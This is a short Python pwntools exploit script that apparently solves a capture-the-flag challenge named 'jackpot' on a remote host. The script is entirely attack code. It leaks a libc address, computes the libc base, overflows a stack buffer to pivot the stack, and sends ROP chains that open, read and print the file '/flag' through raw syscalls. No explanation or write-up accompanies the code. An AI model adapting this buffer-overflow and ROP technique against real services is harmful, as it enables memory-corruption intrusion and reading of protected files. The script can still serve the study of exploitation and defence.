from pwn import *

r = process('./jackpot')
r = remote('10.105.0.21', 12167)

context.arch = 'amd64'

r.recvuntil(b'Give me your number: ')
r.sendline(b'31')
r.recvuntil(b'Here is your ticket 0x')
leak_libc = int(r.recvline()[:-1], 16)
log.info(f'{hex(leak_libc)=}')

libc_base = leak_libc - 0x1d90 - 0x28000
log.info(f'{hex(libc_base)=}')

r.recvuntil(b'Sign your name: ')
pop_rax_ret = libc_base + 0x0000000000045eb0
pop_rdi_ret = libc_base + 0x000000000002a3e5
pop_rsi_ret = libc_base + 0x000000000002be51
pop_rdx_ret = libc_base + 0x00000000000796a2
syscall_ret = libc_base + 0x0000000000091316
bss_flag_addr = 0x00000000004043f8
bss_rbp = 0x0000000000404400
main_fn = 0x4013d4

rop_open_flag = flat(
    # Open filename
    # fd = open("/flag", 0);
    pop_rax_ret, 2,
    pop_rdi_ret, bss_flag_addr,
    pop_rsi_ret, 0,
    syscall_ret,

    main_fn
)
rop_read_flag = flat(
    # Read the file
    # read(fd, buf, 0x30);
    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, bss_flag_addr + 0x2b8,
    pop_rdx_ret, 0x30,
    syscall_ret,

    main_fn
)
rop_write_flag = flat(
    # Write the file
    # write(1, buf, 0x30);
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, bss_flag_addr + 0x2b8,
    pop_rdx_ret, 0x30,
    syscall_ret
)

r.send(b'a'*14*8 + p64(bss_rbp) + p64(main_fn))
# raw_input()
r.send(b'a'*13*8 + b'/flag'.ljust(0x8, b'\x00') + p64(bss_rbp+0x88+0x70) + rop_open_flag)
raw_input()
r.send(b'a'*13*8 + b'/flag'.ljust(0x8, b'\x00') + p64(bss_rbp+0x88*2+0x70+0x40+0x4+0x48) + rop_read_flag)
# raw_input()
r.send(b'a'*13*8 + b'/flag'.ljust(0x8, b'\x00') + p64(bss_rbp+0x288) + rop_write_flag)

r.interactive()